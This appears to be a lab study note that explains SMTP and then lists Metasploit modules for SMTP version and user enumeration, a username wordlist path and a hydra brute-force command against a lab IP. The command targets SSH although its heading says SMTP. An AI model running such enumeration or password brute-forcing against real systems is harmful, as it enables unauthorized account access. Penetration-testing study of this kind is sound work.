## What is SMTP ?

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

     It verifies who is sending emails through the SMTP server.
     It sends the outgoing mail
     If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

## Enumerating SMTP (with metasploit)

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible.

### Module smtp_version

```
auxiliary/scanner/smtp/smtp_version
```

```
auxiliary/scanner/smtp/smtp_enum
```

### Location of username lists : 

```bash
/usr/share/seclists/Usernames
```

### Exploiting SMTP with hydra

```
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.26.205 ssh
```
